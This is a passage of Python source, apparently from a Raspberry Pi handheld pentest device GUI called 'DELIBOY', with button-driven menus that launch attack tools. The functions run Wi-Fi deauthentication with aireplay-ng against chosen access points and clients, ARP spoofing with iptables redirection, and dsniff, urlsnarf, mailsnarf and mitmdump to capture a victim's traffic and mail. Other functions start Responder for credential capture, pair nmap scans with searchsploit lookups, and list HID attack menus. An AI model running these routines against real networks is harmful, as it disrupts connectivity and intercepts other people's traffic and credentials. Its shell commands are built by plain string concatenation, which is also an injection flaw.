        if not GPIO.input(KEY1_PIN):  # button is released
            choice = 1  # A button
        if not GPIO.input(KEY3_PIN):  # button is released
            choice = 2
    display.text("", "", "", "    wait ", "", "", "")

    if choice == 1:
        cmd = "nmap -Pn -A " + selected
        result = system.execCmd(cmd)
        f = open("nmap/" + str(selected) + ".txt", "w+")
        reportList = str(result).split("'")[1].split("\\n")
        for line in reportList:
            # print(line + "\\n")
            f.write(line + "\n")
        f.close()
        cmd = "cat " + selected + ".txt | grep tcp"
        result = system.execCmd(cmd)
    else:
        cmd = "nmap -Pn -A " + selected + " | grep tcp"
        result = system.execCmd(cmd)

    result = str(result).split("'")[1].split("\\n")[:-1]
    print(result)
    toprint = ["", "", "", "", "", "", ""]
    for i in range(0, len(result)):
        if i >= len(toprint):
            break
        toprint[i] = "_" + result[i]
    display.text(
        toprint[0],
        toprint[1],
        toprint[2],
        toprint[3],
        toprint[4],
        toprint[5],
        toprint[6],
    )
    time.sleep(10)
    # TODO add the vulnerability scan


def update():
    display.text("", "", "", "U NEED Wifi Connection ", "", "", "")
    time.sleep(8)
    try:
        # Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'], stdout=open('/dev/null','w'), stderr=open('/dev/null','a'),preexec_fn=os.setpgrp )
        Popen(["nohup", "/bin/bash", "/root/BeBoXGui/update.sh"], preexec_fn=os.setpgrp)
        display.text(
            "updating",
            ":)",
            "im updating",
            "the screen will freeze",
            "it's normal",
            "",
            ":>",
        )
        time.sleep(10)
        exit()
    except subprocess.CalledProcessError as e:
        print(e.output)
        display.error()
        display.text("", "", "", "Do U have Wifi Connection? ", "", "", "")
        time.sleep(5)


def vulnerabilityScan():
    display.text(
        "Remeber:",
        "First u need to",
        "perform an Nmap",
        "and then ",
        "save the output",
        "this is an",
        "experimental feat",
    )
    time.sleep(5)
    display.text("", "", "", "Wait", "", "", "")
    selected = ui.fileSelect("/root/BeBoXGui/nmap/", ".txt")
    filePath = "/root/BeBoXGui/nmap/" + selected
    cmd = "cat " + filePath + " |  grep -v Discovered | grep  tcp"
    result = system.execCmd(cmd)
    toSearch = str(result).split("'")[1].split("\\n")
    del toSearch[-1]
    founded = 0
    for i in toSearch:
        auxi = i.replace("\t", " ").replace("   ", " ").replace("  ", " ").split(" ")
        print(auxi)
        i = str(" ".join(auxi[3:]))
        print("search for: " + i)
        cmd = "searchsploit " + "'" + str(i) + "'"
        result = system.execCmd(cmd)
        if (str(result).split("'")[1])[1] == "-":
            founded += 1
    print(founded)
    display.text("", "", "", "founded: " + str(founded), "", "", "")
    time.sleep(5)

def enableMonitorMode():
    display.text("","","enabling", "monitor mode","","","")
    system.execCmd("airmon-ng start wlan0")
    display.text("","","monitor mode", "enabled!","","","")
    time.sleep(0.5)

def disableMonitorMode():
    display.text("","","disabling", "monitor mode","","","")
    system.execCmd("airmon-ng stop wlan0mon")
    display.text("","","monitor mode", "disabled!","","","")
    time.sleep(0.5)

def getSSID():
    # return [name,channel,mac]
    display.text("", "", "please wait", "scanning ssids", "", "", "")
    # list wifi APs
    cmd = "airmon-ng start wlan0 && airmon-ng start wlan0mon"
    result = system.execCmd(cmd)
    try:
        cmd = "touch touchedcommand.sh && echo '#!/bin/bash\nairodump-ng wlan0mon -w reportAiro -a &' > touchedcommand.sh && chmod +x touchedcommand.sh"
        result = system.execCmd(cmd)
        # Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'], stdout=open('/dev/null','w'), stderr=open('/dev/null','a'),>
        Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
        display.text("", "", "wait", "", "", "", "")
        time.sleep(10)
        error = 0
        while error == 0:
            cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a' | grep -v grep | head -n 1 | awk '{ print $2 }'"
            result = system.execCmd(cmd)
            cmd = "kill " + (str(result).split("'")[1])[:-2]
            # print(cmd)
            result = system.execCmd(cmd, skipError=True)
            if result == -1:
                error = 1

    except subprocess.CalledProcessError as e:
        print(e.output)
        display.errorNew("failed to get ssids")
        time.sleep(5)
        return ()
    cmd = "cat reportAiro-01.csv"
    result = system.execCmd(cmd)
    cmd = "rm -rf reportAiro* && rm -f nohup.out && rm -f touchedcommand.sh"
    system.execCmd(cmd)
    result = str(result).replace("\\r", "").split("\\n")
    del result[0]
    del result[0]
    toRemove = result.index(
        "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
    )
    result = result[: toRemove - 1]
    for i in range(0, len(result)):
        result[i] = result[i].split(",")
        del result[i][-1]
        result[i] = result[i][-1] + "," + result[i][3] + "," + result[i][0]

    ssidlist = result
    # print("eccomi")
    # print(ssidlist)

    # ----------------------------------------------------------
    listattack = ssidlist
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if not GPIO.input(KEY_UP_PIN):
            cur = cur - 1
            if cur < 0:
                cur = 0
        if not GPIO.input(KEY_DOWN_PIN):
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if not GPIO.input(KEY_LEFT_PIN):  # button is released
            return ()
        if not GPIO.input(KEY_RIGHT_PIN):
            lastmenu = listattack[cur]
            # print(lastmenu)
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        display.text(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""


def deauther():
    target = getSSID()
    print(target)
    # name,channel,mac
    display.text("this will work", "for 10 second", "", "", "", "", "")
    try:
        target = target.split(",")
        print(target[2])
    except subprocess.CalledProcessError as e:
        print(e.output)
        display.errorNew("error finding targets")
        return ()

    # cmd = "airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon && echo 'finito' "
    ##cmd2 =  "aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
    tx1 = (
        "timeout 2s airodump-ng -c "
        + str(target[1])
        + " --bssid "
        + str(target[2])
        + " wlan0mon"
    )
    tx2 = "timeout 60s aireplay-ng -0 0 -a " + str(target[2]) + " wlan0mon"
    cmd = (
        "touch touchedcommand.sh && echo '#!/bin/bash\n"
        + tx1
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    system.execCmd(cmd)
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    display.text("", "", "set the channel", "", "", "", "")
    time.sleep(4)
    # print(cmd)
    # subprocess.call(["timeout 2s",str(cmd)])
    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
    cmd = (
        "echo '#!/bin/bash\n"
        + tx2
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    system.execCmd(cmd)
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    display.text("", "", "doing the stuff", "", "", "", "")
    time.sleep(10)
    cmd = "rm -f touchedcommand.sh"
    system.execCmd(cmd)
    return ()

def deautherClient():
    ###select the AP
    display.msg("Select the AP", 3)
    # name,channel,mac
    selectedAP = getSSID()
    try:
        selectedAP = selectedAP.split(",")
        print(selectedAP)
    except subprocess.CalledProcessError as e:
        print(e.output)
        display.error()
        return ()
    display.msg("select the Client", 1)
    if not selectedAP:
        display.error()
        return ()
    cmd = (
        " airodump-ng -d "
        + selectedAP[2]
        + " -c "
        + selectedAP[1]
        + " wlan0mon -w result"
    )
    # print(cmd)

    if autoKillCommand(cmd, 20) == -1:
        display.error()
        return ()
    cmd = "cat result-01.csv"
    result = system.execCmd(cmd)
    result = str(result).replace("\\r", "").split("\\n")
    toRemove = result.index(
        "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs"
    )
    result = result[toRemove + 1 : -1]
    # print(result)
    del result[-1]
    for i in range(0, len(result)):
        result[i] = result[i].split(",")[0]
    selectedtarget = checklist(result)
    # print(selectedtarget)
    display.msg("Deauthing", 1)
    tx1 = (
        "airodump-ng -c "
        + str(selectedAP[1])
        + " --bssid "
        + str(selectedAP[2])
        + " wlan0mon"
    )
    tx2 = (
        "aireplay-ng -0 0 -a "
        + str(selectedAP[2])
        + " -c "
        + str(selectedtarget)
        + " wlan0mon"
    )
    print(tx1)
    if autoKillCommand(tx1, 2) == -1:
        display.error()
        return ()
    print(tx2)
    if autoKillCommand(tx2, 30) == -1:
        display.error()
        return ()

    cmd = "killall airodump-ng && killall aireplay-ng"
    system.execCmd(cmd)

    display.msg("Done", 4)
    cmd = "rm -rf result*"
    system.execCmd(cmd)

    return ()

# todo: this shit is broken
# execCmd run in background, nohup or & or something
# mitmdump is no longer available on pi zero...
# prolly better off making services we can enable disable
def arpSpoof():
    myTime = 86400
    display.msg("scanning for hosts", 3)
    victimIP = hostSelect()
    display.msg("Please Wait", 1)
    cmd = "sysctl -w net.ipv4.ip_forward=1"
    result = system.execCmd(cmd)

    cmd = "ip r | grep default |  head -n 1 | cut -d ' ' -f3"
    result = system.execCmd(cmd)
    routerIp = (str(result).split("'")[1])[:-2]
    print(routerIp)
    print(victimIP)
    cmd1 = "arpspoof -i wlan0 -t " + str(victimIP) + " " + str(routerIp)
    cmd2 = "arpspoof -i wlan0 -t " + str(routerIp) + " " + str(victimIP)
    cmd3 = cmd1 + " &\n" + cmd2 + " &"
    if autoKillCommandNoKill(cmd3, myTime) == -1:
        display.error()
        return ()
    #system.execCmd(cmd3)
    cmd1 = "iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
    cmd2 = "iptables-legacy -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080"
    system.execCmd(cmd1)
    system.execCmd(cmd2)

    cmdDsniff = "dsniff -i wlan0 -w Dsniff" + str(victimIP) + ".txt"
    cmdUrl = "urlsnarf -i wlan0 > Url" + str(victimIP) + ".clf"
    cmdMITM = (
        " mitmdump --mode transparent --showhost -w Mitm" + str(victimIP) + ".mitm"
    )
    cmdMail = "mailsnarf -i wlan0 > Mail" + str(victimIP) + ".mbox"

    display.msg("dsniff", 1)
    system.execCmd(cmdDsniff)
    display.msg("urlsnarf", 1)
    system.execCmd(cmdUrl)
    display.msg("mitmdump", 1)
    system.execCmd(cmdMITM)
    display.msg("mailsnarf", 1)
    system.execCmd(cmdMail)

    time.sleep(10)
    uscire = 0
    while uscire == 0:
        if not GPIO.input(KEY_RIGHT_PIN):
            uscire = 1
        display.msg("press right to exit", 0.2)

    #killCommand("dsniff")
    #killCommand("urlsnarf")
    #killCommand("mitm")
    #killCommand("mailsnarf")
    # killCommand("arpspoof")
    # killCommand("arpspoof")

    system.execCmd("killall dsniff")
    system.execCmd("killall urlsnarf")
    system.execCmd("killall mailsnarf")
    system.execCmd("killall arpspoof")

    cmd = "iptables-legacy -t nat -F"
    result = system.execCmd(cmd)
    cmd = "sysctl -w net.ipv4.ip_forward=0"
    result = system.execCmd(cmd)


# system information sub routine
def systemInfo():
    while GPIO.input(KEY_LEFT_PIN):
        now = datetime.datetime.now()
        today_time = now.strftime("%H:%M:%S")
        today_date = now.strftime("%d %b %y")
        cmd = "hostname -I"
        result = system.execCmd(cmd)

        IP = result.split(" ")[0]
        IP2 = result.split(" ")[1]
        IP3 = result.split(" ")[2]

        if UPS == 1:
            # volt = "BAT :%5.2fV " % readVoltage(bus) #Battery Voltage is irrelevant and takes too much space on screen
            batt = int(ups.readCapacity(bus))
            if batt > 100:
                batt = 100
            batt = " BAT: " + str(batt) + "%"
        else:
            batt = " BAT: N/C"

        # BattTemp = volt + str(batt) + "% t:" + str(temp)
        # print(str(subprocess.check_output(cmd, shell = True )))
        cmd = "top -bn1 | grep %Cpu | awk '{printf \"%.0f\",$2}'"
        result = system.execCmd(cmd)
        temp = os.popen("cat /sys/class/thermal/thermal_zone0/temp").readline()
        temp = int(temp) / 1000
        CPU = "CPU.:" + result.split("'")[1] + "% TEMP:" + str(temp)
        cmd = "free -m | awk 'NR==2{printf \"MEM :%.2f%%\", $3*100/$2 }'"
        result = system.execCmd(cmd)
        MemBat = result.split("'")[1] + batt
        cmd = 'df -h | awk \'$NF=="/"{printf "Disk: %d/%dGB %s", $3,$2,$5}\''
        Disk = result.split("'")[1]
        # print(str(IP3))
        if str(IP3) == str("\\n'"):
            IP3 = "refresh the Connection"
        display.text(
            today_date + " " + today_time,
            str(CPU),
            str(MemBat),
            Disk,
            "WIFI: " + IP.split("'")[1],
            "BTH.: " + str(IP3),
            "USB.: " + str(IP2),
        )
        time.sleep(0.1)
    # page = 7


def menuResponderAttack():
    print("Responder")
    interface = None
    while GPIO.input(KEY_LEFT_PIN):
        responder_status = checkResponder()

        menu_responder = {
            "Interface: " + str(interface): selectNetworkInterface,
        }

        if interface is not None:
            menu_responder["Run"] = runResponder

        print(responder_status)
        if responder_status:
            menu_responder = {
                "Stop Job": killResponder
            }

        selection = None
        selection = ui.scrollDictMenu(menu_responder)
        print("responder status: " + str(responder_status))

        if selection is not None:
            if selection == selectNetworkInterface:
                interface = selectNetworkInterface()
            elif selection == runResponder:
                display.text("","","","starting","","","")
                runResponder(interface)
                display.text("","","","responder is running","","","")
                time.sleep(0.5)
            elif selection == killResponder:
                display.text("","","","killing responder","","","")
                killResponder()
                display.text("","","","responder is dead","","","")
                time.sleep(0.5)

def runResponder(interface: str):
    cmd = "python3 /opt/Responder/Responder.py -I " + interface + " -w -F -P -v"
    system.execCmdInBackground(cmd)
    #print(result)

def checkResponder():
    cmd = "ps -aux | grep -i responder | grep -v grep | awk '{ print $2 }'"
    pid = system.execCmd(cmd)
    len(pid)
    print(pid + " " + str(len(pid)))
    if pid.strip().isdigit():
        print("pid of responder is " + str(pid))
        return pid
    return ""

def killResponder():
    pid = checkResponder()

    if pid.isdigit():
        print("pid of responder is " + str(pid))
        display.msg("killing " + str(pid), 0.3)
        system.execCmd("kill -9 " + str(pid))

def selectNetworkInterface():
    # Get list of network interfaces
    interfaces = subprocess.check_output(['ls', '/sys/class/net']).decode().split()

    # Use scrollMenu to select an interface
    index = ui.scrollMenu(interfaces)

    # Return the selected interface
    #print(interfaces[index])
    if index is not None:
        return interfaces[index]

def menuSystemSettings():
    time.sleep(0.1)
    menu_systemsettings = {
        "System Information": systemInfo,
        "Display Brightness": display.setContrast,
        #"Host OS Detection"
        "Display Off": display.screenOff,
        "Key Tester": keyTest,
        "Restart GUI": restart,
        "Reboot System": reboot,
        "Shutdown System": shutdown
    }
    print("System Settings")
    ui.functionalMenu(menu_systemsettings)
    return None

def menuHidAttacks():
    time.sleep(0.1)
    menu_hidattacks = {
        "Run HIDScript": runHidScript,
        "Emulate Keypad": emuGamepad,
        "Emulate Mouse": emuMouse,
        "Set Typing Speed": setTypingSpeed
        #"Set Key Layout": systemInfo
    }
    print("HID Attacks")
    ui.functionalMenu(menu_hidattacks)
    return None

def menuWirelessAttacks():
    time.sleep(0.1)
    menu_wirelessattacks = {
        "Enable Monitor Mode": enableMonitorMode,
        "Disable Monitor Mode": disableMonitorMode
    }
    print("Wireless Attacks")
    ui.functionalMenu(menu_wirelessattacks)
    return None

def menuNetworkAttacks():
    time.sleep(0.1)
    menu_networkattacks = {
        "Show Interfaces": selectNetworkInterface,
        "Responder.py": menuResponderAttack
    }
    print("Network Attacks")
    ui.functionalMenu(menu_networkattacks)
    return None

def menuHome():
    time.sleep(0.1)
    menu_home = {
        "      DELIBOY       ": about,
        "SYSTEM SETTINGS": menuSystemSettings,
        "HID ATTACKS": menuHidAttacks,
        "WIRELESS ATTACKS": menuWirelessAttacks,
        # "TRIGGERS": menuP4wnP1Triggers,
        # "TEMPLATES": menuP4wnP1Templates,
        "NETWORK ATTACKS": menuNetworkAttacks,
        # "USBETH ATTACKS": menuUSBEthAttacks,
        # "TEST MENU": menuTest,
        # "EXAMPLE 1": example,
        # "EXAMPLE 2": example,
    }
    print("Home Menu")
    while True:
        ui.functionalMenu(menu_home)

def backgroundRescueReboot(channel):
    global buttonStatus
    start_time = time.time()

    while GPIO.input(channel) == 0: # Wait for the button up
        pass

    buttonTime = time.time() - start_time    # How long was the button down?

    if .1 <= buttonTime < 4:        # Ignore noise
        buttonStatus = 1        # 1= brief push

    elif 4 <= buttonTime < 7:
        buttonStatus = 2        # 2= Long push
        restart()

    elif buttonTime >= 7:
        buttonStatus = 3        # 3= really long push
        display.text("","","","  bye bye!","","","")
        system.execCmd("reboot")

    display.text("","",str(buttonStatus),"","","","")

GPIO.add_event_detect(KEY1_PIN, GPIO.FALLING, callback=backgroundRescueReboot, bouncetime=500)

# init vars
cursor = 1
page = 0
menu = 1
item = ["", "", "", "", "", "", "", ""]
selection = 0
if SCNTYPE == 1:
    print("sctype")
    ui.splash()  # display boot splash image ---------------------------------------------------------------------
    # print("selected : " + ui.fileSelect(hidpath,".js"))
    display.device.contrast(255)
while 1:
    if not GPIO.input(KEY_UP_PIN):
        cursor = cursor - 1
        if cursor < 1:
            if page == 49:
                page = 0
            elif page == 0:
                page = 49
            cursor = 7

    if not GPIO.input(KEY_LEFT_PIN):
        # back to main menu on Page 0
        page = 0
    if not GPIO.input(KEY_RIGHT_PIN):
        selection = 1
    if not GPIO.input(KEY_DOWN_PIN):
        cursor = cursor + 1
        if cursor > 7:
            if page == 0:
                page = 49
            elif page == 49:
                page = 0
            cursor = 1
    # -----------
    if selection == 1:
        # une option du menu a ete validee on va calculer la page correspondante
        if page == 7:
            # system menu
            if cursor == 1:
                systemInfo()
            if cursor == 2:
                brightness = display.setContrast(display.brightness)
            if cursor == 3:
                # os detection
                usbEthOsDetection()
            if cursor == 4:
                display.screenOff()
            if cursor == 5:
                keyTest()
            if cursor == 6:
                # cmd = "reboot"
                # subprocess.check_output(cmd, shell = True )
                restart()
            if cursor == 7:
                #exit()
                cmd = "reboot"
                system.execCmd(cmd)

        if page == 14:
            # HID related menu
            if cursor == 1:
                # run hid script
                runHidScript()
            if cursor == 2:
                # emuGamepad
                emuGamepad()
            if cursor == 3:
                # emuMouse
                emuMouse()
            if cursor == 4:
                # Set typing speed
                setTypingSpeed()
        if page == 21:
            if cursor == 1:
                # SSID LIST
                scanwifi()
            if cursor == 2:
                hostSelect()
            if cursor == 3:
                nmap()
            if cursor == 4:
                vulnerabilityScan()
            if cursor == 5:
                deauther()
            if cursor == 6:
                deautherClient()
        if page == 28:
            # trigger section
            if cursor == 1:
                runTriggers()
        if page == 35:
            # template section menu
            if cursor == 1:
                # FULL_SETTINGS
                template = templateSelect("FULL_SETTINGS")
                if template != "":
                    applyTemplate(template, "f")
            if cursor == 2:
                # BLUETOOTH
                template = templateSelect("BLUETOOTH")
                if template != "":
                    applyTemplate(template, "b")
            if cursor == 3:
                # USB
                template = templateSelect("USB")
                print(template)
                if template != "":
                    applyTemplate(template, "u")
            if cursor == 4:
                # WIFI
                template = templateSelect("WIFI")
                if template != "":
                    applyTemplate(template, "w")
            if cursor == 5:
                # TRIGGER_ACTIONS
                template = templateSelect("TRIGGER_ACTIONS")
                if template != "":
                    applyTemplate(template, "t")
            if cursor == 6:
                # NETWORK
                template = templateSelect("NETWORK")
                if template != "":
                    applyTemplate(template, "n")
        if page == 42:
            # network attacks
            if cursor == 1:
                arpSpoof()
            if cursor == 2:
                print("oof")

        # usbeth attacks
        if page == 56:
            if cursor == 1:
                nmapLocal()

        # test menu
        if page == 63:
            if cursor == 1:
                ui.scrollMenu(["Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.","Ipsum","Alpha","beta","Ipsum","Alpha","beta","Ipsum","Alpha","beta","Ipsum","Alpha","beta"])
            if cursor == 2:
                ui.scrollMenu(["alpha","beta","gamma","alpha","beta"])
            if cursor == 3:
                selectNetworkInterface()
            if cursor == 4:
                menuHome()

        if page == 0:
            # we are in main menu
            if cursor == 1:
                # call about
                about()
            if cursor == 2:
                # system settings
                page = 7
                cursor = 1
            if cursor == 3:
                # hid attacks menu
                page = 14
                cursor = 1
            if cursor == 4:
                # wireless attacks menu
                page = 21
                cursor = 1
            if cursor == 5:
                # triggers
                page = 28
                cursor = 1
            if cursor == 6:
                # templates
                page = 35
                cursor = 1
            if cursor == 7:
                # mitm attacks
                page = 42
                cursor = 1

        # 2nd main menu
        if page == 49:
            if cursor == 1:
                # usbeth attacks
                page = 56
            if cursor == 2:
                # test menu
                page = 63
                cursor = 1
            if cursor == 7:
                update()

            print(page + cursor)
    item[1] = switchMenu(page)
    item[2] = switchMenu(page + 1)
    item[3] = switchMenu(page + 2)
    item[4] = switchMenu(page + 3)
    item[5] = switchMenu(page + 4)
    item[6] = switchMenu(page + 5)
    item[7] = switchMenu(page + 6)
    # add curser on front on current selected line
    for n in range(1, 8):
        if page + cursor == page + n:
            if page == 1:
                if ups.readCapacity(bus) < 16:
                    item[n] = item[n].replace("_", "!")
                else:
                    item[n] = item[n].replace("_", ">")
            else:
                item[n] = item[n].replace("_", ">")
        else:
            item[n] = item[n].replace("_", " ")
    display.text(item[1], item[2], item[3], item[4], item[5], item[6], item[7])
    # print(page+cursor) #debug trace menu value
    time.sleep(0.1)
    selection = 0
GPIO.cleanup()
